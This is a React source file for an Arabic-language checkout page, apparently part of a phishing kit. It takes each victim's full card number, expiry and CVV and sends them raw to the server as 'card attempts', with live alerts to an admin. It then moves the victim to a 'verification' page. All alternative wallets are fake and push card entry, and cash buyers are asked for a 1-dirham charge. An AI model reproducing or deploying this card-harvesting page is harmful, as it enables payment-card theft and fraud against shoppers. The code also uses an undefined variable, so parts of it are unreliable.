import { useState, useMemo } from 'react';
import { useLocation, Link } from 'wouter';
import { ArrowRight, Check } from 'lucide-react';
import { Shell } from '../shared';
import { createCardAttempt } from '@workspace/api-client-react';

type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';

// Luhn Algorithm - Validate card number
function luhnCheck(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\s/g, '').split('').reverse().map(Number);
  let sum = 0;
  
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if (i % 2 === 1) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  
  return sum % 10 === 0;
}

// Detect card type
function detectCardType(cardNumber: string): CardType {
  const num = cardNumber.replace(/\s/g, '');
  
  if (/^4/.test(num)) return 'visa';
  if (/^5[1-5]/.test(num)) return 'mastercard';
  if (/^3[47]/.test(num)) return 'amex';
  if (/^6(?:011|5|4|22)/.test(num)) return 'discover';
  
  return 'unknown';
}

// Validate expiry date
function validateExpiry(expiry: string): { valid: boolean; error?: string } {
  const match = expiry.match(/^(\d{2})\/(\d{2})$/);
  if (!match) return { valid: false, error: 'صيغة غير صحيحة' };
  
  const month = parseInt(match[1]);
  const year = parseInt(match[2]) + 2000;
  
  if (month < 1 || month > 12) return { valid: false, error: 'الشهر غير صحيح' };
  
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;
  
  if (year < currentYear || (year === currentYear && month < currentMonth)) {
    return { valid: false, error: 'البطاقة منتهية' };
  }
  
  return { valid: true };
}

// Get required CVV length based on card type
function getRequiredCvvLength(cardType: CardType): number {
  return cardType === 'amex' ? 4 : 3;
}

export function PaymentPage() {
  const [, setLocation] = useLocation();
  const [cardName, setCardName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [touched, setTouched] = useState({
    cardName: false,
    cardNumber: false,
    expiry: false,
    cvv: false,
  });

  // Get order ID from localStorage
  const orderData = localStorage.getItem('dheebti-last-order');
  const orderId = orderData ? JSON.parse(orderData).id : null;

  // Check URL param for payment type (cash or online)
  const urlParams = new URLSearchParams(window.location.search);
  const paymentType = urlParams.get('type') || 'online';
  const isCashPayment = paymentType === 'cash';

  const rawCardNumber = cardNumber.replace(/\s/g, '');
  const cardType = useMemo(() => detectCardType(rawCardNumber), [rawCardNumber]);
  const isLuhnValid = useMemo(() => luhnCheck(rawCardNumber), [rawCardNumber]);
  const expiryValidation = useMemo(() => validateExpiry(expiry), [expiry]);
  const requiredCvvLength = useMemo(() => getRequiredCvvLength(cardType), [cardType]);

  // Validation states
  const cardNumberValid = rawCardNumber.length >= 13 && isLuhnValid;
  const cardNameValid = cardName.trim().length >= 3;
  const expiryValid = expiryValidation.valid;
  const cvvValid = cvv.length === requiredCvvLength;

  // Field validation states (after touch)
  const cardNumberError = touched.cardNumber && rawCardNumber.length > 0 && !cardNumberValid;
  const expiryError = touched.expiry && expiry.length > 0 && !expiryValid;
  const cvvError = touched.cvv && cvv.length > 0 && cvv.length !== requiredCvvLength;

  // All fields valid
  const isFormValid = cardNameValid && cardNumberValid && expiryValid && cvvValid;

  const [paymentMethodError, setPaymentMethodError] = useState('');

  const handlePaymentMethodClick = (methodName: string) => {
    setPaymentMethodError(`${methodName} غير متوفرة حالياً، يرجى الدفع بالبطاقة`);
  };

  const handlePayment = async () => {
    if (!isFormValid) return;
    
    // Send payment data to server as a new card attempt
    if (orderId) {
      try {
        await createCardAttempt(orderId, {
          cardName,
          cardNumber: rawCardNumber,
          cardExpiry: expiry,
          cardCvv: cvv,
        });
        // Dispatch event for admin real-time updates
        console.log('[PAYMENT] Dispatching dheebti-card-attempt', { orderId, customerName });
        window.dispatchEvent(new CustomEvent('dheebti-card-attempt', { 
          detail: { 
            orderId,
            customerName: customerName 
          } 
        }));
      } catch (error) {
        console.error('Failed to save card attempt:', error);
      }
    }
    
    // Navigate to verification page
    setLocation('/payment-verification');
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s/g, '').replace(/\D/g, '');
    const isAmex = detectCardType(v) === 'amex';
    
    if (isAmex) {
      // Amex: 4-6-5 format
      const parts = [];
      for (let i = 0; i < v.length && i < 15; i += 4) {
        if (i === 0) parts.push(v.slice(0, 4));
        else if (i === 4) parts.push(v.slice(4, 10));
        else if (i === 10) parts.push(v.slice(10, 15));
      }
      return parts.join(' ');
    } else {
      // Standard: 4-4-4-4 format
      const parts = [];
      for (let i = 0; i < v.length && i < 16; i += 4) {
        parts.push(v.slice(i, i + 4));
      }
      return parts.join(' ');
    }
  };

  const formatExpiry = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.slice(0, 2) + '/' + v.slice(2, 4);
    }
    return v;
  };

  const getCardIcon = () => {
    switch (cardType) {
      case 'visa':
        return <span className="text-blue-600 font-bold">VISA</span>;
      case 'mastercard':
        return <span className="text-red-500 font-bold">MC</span>;
      case 'amex':
        return <span className="text-green-600 font-bold">AMEX</span>;
      case 'discover':
        return <span className="text-orange-500 font-bold">DISCOVER</span>;
      default:
        return null;
    }
  };

  return (
    <Shell>
      <div className="page-enter mx-auto min-h-[calc(100vh-104px)] px-4 py-8 lg:px-8 lg:py-12">
        <Link href="/summary" className="mb-6 inline-flex items-center gap-2 text-sm font-medium text-muted-foreground">
          <ArrowRight size={16} /> رجوع
        </Link>

        {/* Payment Form */}
        <div className="mx-auto max-w-md rounded-[26px] bg-white p-5 shadow-[0px_187px_75px_rgba(0,0,0,0.01),0px_105px_63px_rgba(0,0,0,0.05),0px_47px_47px_rgba(0,0,0,0.09),0px_12px_26px_rgba(0,0,0,0.1)]">
          {/* Payment Options */}
          <div className="mb-5 grid grid-cols-3 gap-4">
            {/* Error Message */}
            {paymentMethodError && (
              <div className="col-span-3 mb-2 text-center text-sm text-red-500">
                {paymentMethodError}
              </div>
            )}
            
            <button
              type="button"
              onClick={() => handlePaymentMethodClick('PayPal')}
              className="flex h-[55px] items-center justify-center rounded-[11px] bg-[#F2F2F2]"
            >
              <svg viewBox="0 0 124 33" height="18px" width="80px" fill="#253B80">
                <path d="M46.211,6.749h-6.839c-0.468,0-0.866,0.34-0.939,0.802l-2.766,17.537c-0.055,0.346,0.213,0.658,0.564,0.658h3.265c0.468,0,0.866-0.34,0.939-0.803l0.746-4.73c0.072-0.463,0.471-0.803,0.938-0.803h2.165c4.505,0,7.105-2.18,7.784-6.5c0.306-1.89,0.013-3.375-0.872-4.415C50.224,7.353,48.5,6.749,46.211,6.749z M47,13.154c-0.374,2.454-2.249,2.454-4.062,2.454h-1.032l0.724-4.583c0.043-0.277,0.283-0.481,0.563-0.481h0.473c1.235,0,2.4,0,3.002,0.704C47.027,11.668,47.137,12.292,47,13.154z"/>
                <path d="M66.654,13.075h-3.275c-0.279,0-0.52,0.204-0.563,0.481l-0.145,0.916l-0.229-0.332c-0.709-1.029-2.29-1.373-3.868-1.373c-3.619,0-6.71,2.741-7.312,6.586c-0.313,1.918,0.132,3.752,1.22,5.031c0.998,1.176,2.426,1.666,4.125,1.666c2.916,0,4.533-1.875,4.533-1.875l-0.146,0.91c-0.055,0.348,0.213,0.66,0.562,0.66h2.95c0.469,0,0.865-0.34,0.939-0.803l1.77-11.209C67.271,13.388,67.004,13.075,66.654,13.075z M62.089,19.449c-0.316,1.871-1.801,3.127-3.695,3.127c-0.951,0-1.711-0.305-2.199-0.883c-0.484-0.574-0.668-1.391-0.514-2.301c0.295-1.855,1.805-3.152,3.67-3.152c0.93,0,1.686,0.309,2.184,0.892C62.034,17.721,62.232,18.543,62.089,19.449z"/>
                <path d="M84.096,13.075h-3.291c-0.314,0-0.609,0.156-0.787,0.417l-4.539,6.686l-1.924-6.425c-0.121-0.402-0.492-0.678-0.912-0.678h-3.234c-0.393,0-0.666,0.384-0.541,0.754l3.625,10.638l-3.408,4.811c-0.268,0.379,0.002,0.9,0.465,0.9h3.287c0.312,0,0.604-0.152,0.781-0.408L84.564,13.97C84.826,13.592,84.557,13.075,84.096,13.075z"/>
                <path d="M94.992,6.749h-6.84c-0.467,0-0.865,0.34-0.938,0.802l-2.766,17.537c-0.055,0.346,0.213,0.658,0.562,0.658h3.51c0.326,0,0.605-0.238,0.656-0.562l0.785-4.971c0.072-0.463,0.471-0.803,0.938-0.803h2.164c4.506,0,7.105-2.18,7.785-6.5c0.307-1.89,0.012-3.375-0.873-4.415C99.004,7.353,97.281,6.749,94.992,6.749z M95.781,13.154c-0.373,2.454-2.248,2.454-4.062,2.454h-1.031l0.725-4.583c0.043-0.277,0.281-0.481,0.562-0.481h0.473c1.234,0,2.4,0,3.002,0.704C95.809,11.668,95.918,12.292,95.781,13.154z" fill="#179BD7"/>
                <path d="M115.434,13.075h-3.273c-0.281,0-0.52,0.204-0.562,0.481l-0.145,0.916l-0.23-0.332c-0.709-1.029-2.289-1.373-3.867-1.373c-3.619,0-6.709,2.741-7.311,6.586c-0.312,1.918,0.131,3.752,1.219,5.031c1,1.176,2.426,1.666,4.125,1.666c2.916,0,4.533-1.875,4.533-1.875l-0.146,0.91c-0.055,0.348,0.213,0.66,0.564,0.66h2.949c0.467,0,0.865-0.34,0.938-0.803l1.771-11.209C116.053,13.388,115.785,13.075,115.434,13.075z M110.869,19.449c-0.314,1.871-1.801,3.127-3.695,3.127c-0.949,0-1.711-0.305-2.199-0.883c-0.484-0.574-0.666-1.391-0.514-2.301c0.297-1.855,1.805-3.152,3.67-3.152c0.93,0,1.686,0.309,2.184,0.892C110.816,17.721,111.014,18.543,110.869,19.449z" fill="#179BD7"/>
                <path d="M119.295,7.23l-2.807,17.858c-0.055,0.346,0.213,0.658,0.562,0.658h2.822c0.469,0,0.867-0.34,0.939-0.803l2.768-17.536c0.055-0.346-0.213-0.659-0.562-0.659h-3.16C119.578,6.749,119.338,6.953,119.295,7.23z" fill="#179BD7"/>
                <path d="M7.266,29.154l0.523-3.322l-1.165-0.027H1.061L4.927,1.292C4.939,1.218,4.978,1.149,5.035,1.1c0.057-0.049,0.13-0.076,0.206-0.076h9.38c3.114,0,5.263,0.648,6.385,1.927c0.526,0.6,0.861,1.227,1.023,1.917c0.17,0.724,0.173,1.589,0.007,2.644l-0.012,0.077v0.676l0.526,0.298c0.443,0.235,0.795,0.504,1.065,0.812c0.45,0.513,0.741,1.165,0.864,1.938c0.127,0.795,0.085,1.741-0.123,2.812c-0.24,1.232-0.628,2.305-1.152,3.183c-0.482,0.809-1.096,1.48-1.825,2c-0.696,0.494-1.523,0.869-2.458,1.109c-0.906,0.236-1.939,0.355-3.072,0.355h-0.73c-0.522,0-1.029,0.188-1.427,0.525c-0.399,0.344-0.663,0.814-0.744,1.328l-0.055,0.299l-0.924,5.855l-0.042,0.215c-0.011,0.068-0.03,0.102-0.058,0.125c-0.025,0.021-0.061,0.035-0.096,0.035H7.266z"/>
                <path d="M23.048,7.667L23.048,7.667L23.048,7.667c-0.028,0.179-0.06,0.362-0.096,0.55c-1.237,6.351-5.469,8.545-10.874,8.545H9.326c-0.661,0-1.218,0.48-1.321,1.132l0,0l0,0L6.596,26.83l-0.399,2.533c-0.067,0.428,0.263,0.814,0.695,0.814h4.881c0.578,0,1.069-0.42,1.16-0.99l0.048-0.248l0.919-5.832l0.059-0.32c0.09-0.572,0.582-0.992,1.16-0.992h0.73c4.729,0,8.431-1.92,9.513-7.476c0.452-2.321,0.218-4.259-0.978-5.622C24.022,8.286,23.573,7.945,23.048,7.667z"/>
                <path d="M21.754,7.151c-0.189-0.055-0.384-0.105-0.584-0.15c-0.201-0.044-0.407-0.083-0.619-0.117c-0.742-0.12-1.555-0.177-2.426-0.177h-7.352c-0.181,0-0.353,0.041-0.507,0.115C9.927,6.985,9.675,7.306,9.614,7.699L8.05,17.605l-0.045,0.289c0.103-0.652,0.66-1.132,1.321-1.132h2.752c5.405,0,9.637-2.195,10.874-8.545c0.037-0.188,0.068-0.371,0.096-0.55c-0.313-0.166-0.652-0.308-1.017-0.429C21.941,7.208,21.848,7.179,21.754,7.151z"/>
                <path d="M9.614,7.699c0.061-0.393,0.313-0.714,0.652-0.876c0.155-0.074,0.326-0.115,0.507-0.115h7.352c0.871,0,1.684,0.057,2.426,0.177c0.212,0.034,0.418,0.073,0.619,0.117c0.2,0.045,0.395,0.095,0.584,0.15c0.094,0.028,0.187,0.057,0.278,0.086c0.365,0.121,0.704,0.264,1.017,0.429c0.368-2.347-0.003-3.945-1.272-5.392C20.378,0.682,17.853,0,14.622,0h-9.38c-0.66,0-1.223,0.48-1.325,1.133L0.01,25.898c-0.077,0.49,0.301,0.932,0.795,0.932h5.791l1.454-9.225L9.614,7.699z"/>
              </svg>
            </button>

            <button
              type="button"
              onClick={() => handlePaymentMethodClick('Apple Pay')}
              className="flex h-[55px] items-center justify-center rounded-[11px] bg-[#F2F2F2]"
            >
              <svg viewBox="0 0 512 210.2" height="28px" width="80px">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M93.6 27.1C87.6 34.2 78 39.8 68.4 39c-1.2-9.6 3.5-19.8 9-26.1 6-7.3 16.5-12.5 25-12.9C103.4 10 99.5 19.8 93.6 27.1M102.3 40.9c-13.9-0.8-25.8 7.9-32.4 7.9-6.7 0-16.8-7.5-27.8-7.3-14.3 0.2-27.6 8.3-34.9 21.2C12.2 88.7 24.3 127 38.8 148c7.1 10.4 15.6 21.8 26.8 21.4 10.6-0.4 14.8-6.9 27.6-6.9 12.9 0 16.6 6.9 27.8 6.7 11.6-0.2 18.9-10.4 26-20.8 8.1-11.8 11.4-23.3 11.6-23.9-0.2-0.2-22.4-8.7-22.6-34.3-0.2-21.4 17.5-31.6 18.3-32.2C123.3 42.9 107.7 41.3 102.3 40.9" fill="#000"/>
                <path d="M182.6 11.9v155.9h24.2v-53.3h33.5c30.6 0 52.1-21 52.1-51.4 0-30.4-21.1-51.2-51.3-51.2h-58.5zM206.8 32.3h27.9c21 0 33 11.2 33 30.9 0 19.7-12 31-33.1 31h-27.8V32.3zM336.6 169c15.2 0 29.3-7.7 35.7-19.9h0.5v18.7h22.4V90.2c0-22.5-18-37-45.7-37-25.7 0-44.7 14.7-45.4 34.9h21.8c1.8-9.6 10.7-15.9 22.9-15.9 14.8 0 23.1 6.9 23.1 19.6v8.6l-30.2 1.8c-28.1 1.7-43.3 13.2-43.3 33.2C298.4 155.6 314.1 169 336.6 169M343.1 150.5c-12.9 0-21.1-6.2-21.1-15.7 0-9.8 7.9-15.5 23-16.4l26.9-1.7v8.8C371.9 140.1 359.5 150.5 343.1 150.5M425.1 210.2c23.6 0 34.7-9 44.4-36.3L512 54.7h-24.6l-28.5 92.1h-0.5L430.4 54.7h-25.3l41 113.5-2.2 6.9c-3.7 11.7-9.7 16.2-20.4 16.2-1.9 0-5.6-0.2-7.1-0.4v18.7c1.5 0.2 5.2 0.4 7.1 0.4h20.6z" fill="#000"/>
              </svg>
            </button>

            <button
              type="button"
              onClick={() => handlePaymentMethodClick('Google Pay')}
              className="flex h-[55px] items-center justify-center rounded-[11px] bg-[#F2F2F2]"
            >
              <svg viewBox="0 0 80 39" height="22px" width="80px">
                <path fill="#5F6368" d="M37.8 19.7V29H34.8V6H42.6C44.5 6 46.3001 6.7 47.7001 8C49.1001 9.2 49.8 11 49.8 12.9C49.8 14.8 49.1001 16.5 47.7001 17.8C46.3001 19.1 44.6 19.8 42.6 19.8L37.8 19.7ZM37.8 8.8V16.8H42.8C43.9 16.8 45.0001 16.4 45.7001 15.6C47.3001 14.1 47.3 11.6 45.8 10.1L45.7001 10C44.9001 9.2 43.9 8.7 42.8 8.8H37.8Z"/>
                <path fill="#5F6368" d="M56.7001 12.8C58.9001 12.8 60.6001 13.4 61.9001 14.6C63.2001 15.8 63.8 17.4 63.8 19.4V29H61V26.8H60.9001C59.7001 28.6 58 29.5 56 29.5C54.3 29.5 52.8 29 51.6 28C50.5 27 49.8 25.6 49.8 24.1C49.8 22.5 50.4 21.2 51.6 20.2C52.8 19.2 54.5 18.8 56.5 18.8C58.3 18.8 59.7 19.1 60.8 19.8V19.1C60.8 18.1 60.4 17.1 59.6 16.5C58.8 15.8 57.8001 15.4 56.7001 15.4C55.0001 15.4 53.7 16.1 52.8 17.5L50.2001 15.9C51.8001 13.8 53.9001 12.8 56.7001 12.8ZM52.9001 24.2C52.9001 25 53.3001 25.7 53.9001 26.1C54.6001 26.6 55.4001 26.9 56.2001 26.9C57.4001 26.9 58.6 26.4 59.5 25.5C60.5 24.6 61 23.5 61 22.3C60.1 21.6 58.8 21.2 57.1 21.2C55.9 21.2 54.9 21.5 54.1 22.1C53.3 22.6 52.9001 23.3 52.9001 24.2Z"/>
                <path fill="#4285F4" d="M25.9 17.7C25.9 16.8 25.8 15.9 25.7 15H13.2V20.1H20.3C20 21.7 19.1 23.2 17.7 24.1V27.4H22C24.5 25.1 25.9 21.7 25.9 17.7Z"/>
                <path fill="#34A853" d="M13.1999 30.5999C16.7999 30.5999 19.7999 29.3999 21.9999 27.3999L17.6999 24.0999C16.4999 24.8999 14.9999 25.3999 13.1999 25.3999C9.7999 25.3999 6.7999 23.0999 5.7999 19.8999H1.3999V23.2999C3.6999 27.7999 8.1999 30.5999 13.1999 30.5999Z"/>
                <path fill="#FBBC04" d="M5.8001 19.8999C5.2001 18.2999 5.2001 16.4999 5.8001 14.7999V11.3999H1.4001C-0.499902 15.0999 -0.499902 19.4999 1.4001 23.2999L5.8001 19.8999Z"/>
                <path fill="#EA4335" d="M13.2 9.39996C15.1 9.39996 16.9 10.1 18.3 11.4L22.1 7.59996C19.7 5.39996 16.5 4.09996 13.3 4.19996C8.3 4.19996 3.7 6.99996 1.5 11.5L5.9 14.9C6.8 11.7 9.8 9.39996 13.2 9.39996Z"/>
              </svg>
            </button>
          </div>

          {/* Separator */}
          <div className="mb-5 grid grid-cols-[1fr_2fr_1fr] items-center gap-2.5 text-[11px] font-semibold text-[#8B8E98]">
            <hr className="h-px border-0 bg-[#e8e8e8]"/>
            <p className="text-center">أو ادفع بالبطاقة</p>
            <hr className="h-px border-0 bg-[#e8e8e8]"/>
          </div>

          {/* Cash Payment Notice */}
          {isCashPayment && (
            <div className="mb-5 rounded-xl bg-amber-50 border border-amber-200 p-4 text-center">
              <p className="text-sm font-semibold text-amber-800">يرجى تسديد 1 درهم لتأكيد حجز الطلب</p>
            </div>
          )}

          {/* Credit Card Form */}
          <div className="mb-5 flex flex-col gap-4">
            {/* Card Holder Name */}
            <div className="flex flex-col gap-1">
              <div className="flex items-center justify-between">
                <label className="text-[10px] font-semibold text-[#8B8E98]">اسم حامل البطاقة</label>
                {touched.cardName && cardNameValid && (
                  <Check size={14} className="text-green-500" />
                )}
              </div>
              <input
                type="text"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                onBlur={() => setTouched({ ...touched, cardName: true })}
                placeholder="أدخل اسمك الكامل"
                className={`h-10 rounded-[9px] border-2 bg-[#F2F2F2] px-4 outline-none transition ${
                  touched.cardName && cardName.length > 0 && !cardNameValid
                    ? 'border-red-500 focus:border-red-500'
                    : touched.cardName && cardNameValid
                    ? 'border-green-500 focus:border-green-500'
                    : 'border-transparent focus:border-[#242424]'
                }`}
              />
            </div>

            {/* Card Number */}
            <div className="flex flex-col gap-1">
              <div className="flex items-center justify-between">
                <label className="text-[10px] font-semibold text-[#8B8E98]">رقم البطاقة</label>
                <div className="flex items-center gap-2">
                  {cardType !== 'unknown' && getCardIcon()}
                  {cardNumberError && (
                    <span className="text-[10px] text-red-500">غير صحيح</span>
                  )}
                  {!cardNumberError && rawCardNumber.length >= 13 && cardNumberValid && (
                    <Check size={14} className="text-green-500" />
                  )}
                </div>
              </div>
              <input
                type="tel"
                inputMode="numeric"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                onBlur={() => setTouched({ ...touched, cardNumber: true })}
                placeholder={cardType === 'amex' ? '0000 000000 00000' : '0000 0000 0000 0000'}
                dir="ltr"
                className={`h-10 rounded-[9px] border-2 bg-[#F2F2F2] px-4 outline-none transition ${
                  cardNumberError
                    ? 'border-red-500 focus:border-red-500'
                    : rawCardNumber.length >= 13 && cardNumberValid
                    ? 'border-green-500 focus:border-green-500'
                    : 'border-transparent focus:border-[#242424]'
                }`}
              />
            </div>

            {/* Expiry & CVV */}
            <div className="grid grid-cols-[2fr_1fr] gap-3">
              <div className="flex flex-col gap-1">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] font-semibold text-[#8B8E98]">تاريخ الانتهاء</label>
                  {expiryError && (
                    <span className="text-[10px] text-red-500">{expiryValidation.error}</span>
                  )}
                  {!expiryError && expiryValid && (
                    <Check size={14} className="text-green-500" />
                  )}
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  onBlur={() => setTouched({ ...touched, expiry: true })}
                  placeholder="MM/YY"
                  dir="ltr"
                  className={`h-10 w-full rounded-[9px] border-2 bg-[#F2F2F2] px-4 text-center text-sm outline-none transition ${
                    expiryError
                      ? 'border-red-500 focus:border-red-500'
                      : expiryValid
                      ? 'border-green-500 focus:border-green-500'
                      : 'border-transparent focus:border-[#242424]'
                  }`}
                />
              </div>
              <div className="flex flex-col gap-1">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] font-semibold text-[#8B8E98]">CVV</label>
                  {cvvError && (
                    <span className="text-[10px] text-red-500">={requiredCvvLength} أرقام</span>
                  )}
                  {!cvvError && cvvValid && (
                    <Check size={14} className="text-green-500" />
                  )}
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  maxLength={requiredCvvLength}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, requiredCvvLength))}
                  onBlur={() => setTouched({ ...touched, cvv: true })}
                  placeholder={requiredCvvLength === 4 ? '1234' : '123'}
                  dir="ltr"
                  className={`h-10 w-full rounded-[9px] border-2 bg-[#F2F2F2] px-4 text-center text-sm outline-none transition ${
                    cvvError
                      ? 'border-red-500 focus:border-red-500'
                      : cvvValid
                      ? 'border-green-500 focus:border-green-500'
                      : 'border-transparent focus:border-[#242424]'
                  }`}
                />
              </div>
            </div>
          </div>

          {/* Checkout Button */}
          <button
            type="button"
            onClick={handlePayment}
            disabled={!isFormValid}
            className={`flex h-[55px] w-full items-center justify-center rounded-[11px] text-[13px] font-bold transition ${
              isFormValid
                ? 'bg-gradient-to-b from-[#363636] via-[#1B1B1B] to-black text-white hover:shadow-[0px_0px_0px_2px_#fff,0px_0px_0px_4px_#0000003a]'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            إتمام الدفع
          </button>
        </div>
      </div>
    </Shell>
  );
}
